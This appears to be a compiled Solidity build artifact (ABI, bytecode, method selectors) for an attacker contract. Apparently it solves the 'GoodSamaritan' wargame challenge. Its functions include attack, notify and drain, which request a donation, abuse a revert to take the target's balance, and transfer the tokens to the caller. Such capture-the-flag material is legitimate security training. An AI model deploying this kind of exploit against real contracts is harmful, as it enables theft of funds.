{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanInstance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"balance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"drain","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610685380380610685833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6105ff806100865f395ff3fe608060405260043610610066575f3560e01c806398d078b41161004157806398d078b4146100ea5780639e5faafc14610109578063b69ef8a81461011d575f5ffd5b8063022ec0951461007957806312065fe0146100b45780639890220b146100d6575f5ffd5b3661007557610073610132565b005b5f5ffd5b348015610084575f5ffd5b505f54610097906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100bf575f5ffd5b506100c8610189565b6040519081526020016100ab565b3480156100e1575f5ffd5b506100736102e3565b3480156100f5575f5ffd5b50610073610104366004610542565b6104a5565b348015610114575f5ffd5b50610073610132565b348015610128575f5ffd5b506100c860015481565b5f8054604080516304a286c760e31b815290516001600160a01b039092169263251436389260048084019382900301818387803b158015610171575f5ffd5b505af1158015610183573d5f5f3e3d5ffd5b50505050565b5f8054604080517f521eb273000000000000000000000000000000000000000000000000000000008152905183926001600160a01b03169163521eb2739160048083019260209291908290030181865afa1580156101e9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061020d9190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa15801561024c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102709190610559565b6040516370a0823160e01b81526001600160a01b038481166004830152919250908216906370a0823190602401602060405180830381865afa1580156102b8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102dc9190610586565b9250505090565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663521eb2736040518163ffffffff1660e01b8152600401602060405180830381865afa158015610333573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103579190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa158015610396573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103ba9190610559565b6040516370a0823160e01b81526001600160a01b0384811660048301529192509082169063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561040c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104309190610586565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b1681526001600160a01b03909216600483015260248201526044015f604051808303815f87803b15801561048b575f5ffd5b505af115801561049d573d5f5f3e3d5ffd5b505050505050565b5f805460408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff166304a286c760e31b17905290516001600160a01b03909216916104fd919061059d565b5f604051808303815f865af19150503d805f8114610536576040519150601f19603f3d011682016040523d82523d5f602084013e61053b565b606091505b5050505050565b5f60208284031215610552575f5ffd5b5035919050565b5f60208284031215610569575f5ffd5b81516001600160a01b038116811461057f575f5ffd5b9392505050565b5f60208284031215610596575f5ffd5b5051919050565b5f82515f5b818110156105bc57602081860181015185830152016105a2565b505f92019182525091905056fea2646970667358221220de304e0186ae0cc96b72c2bd624560159ee2729fd8213b42ef67c8a4c2ee29fd64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","balance()":"b69ef8a8","drain()":"9890220b","getBalance()":"12065fe0","instance()":"022ec095","notify(uint256)":"98d078b4"},"id":0}